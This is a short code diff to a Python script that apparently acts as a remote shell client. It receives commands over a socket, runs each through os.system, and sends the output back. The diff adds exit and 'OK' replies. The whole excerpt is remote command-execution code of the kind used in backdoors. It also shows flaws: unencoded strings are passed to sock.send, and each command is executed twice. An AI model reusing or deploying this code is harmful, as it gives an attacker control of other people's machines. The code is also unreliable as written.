@@ -26,12 +26,14 @@ while True:
     cmd = sock.recv(1024).decode()
 
     if cmd == '$close':
+        sock.send("Exiting Client")
+        sock.close()
         break
-
+        
+    if cmd in no_output:
+        sock.send("OK")
 
     os.system(command=str(cmd))
-    sock.send(
-        subprocess.getoutput(cmd).encode()
-    )
+    sock.send(subprocess.getoutput(cmd).encode())
     
     
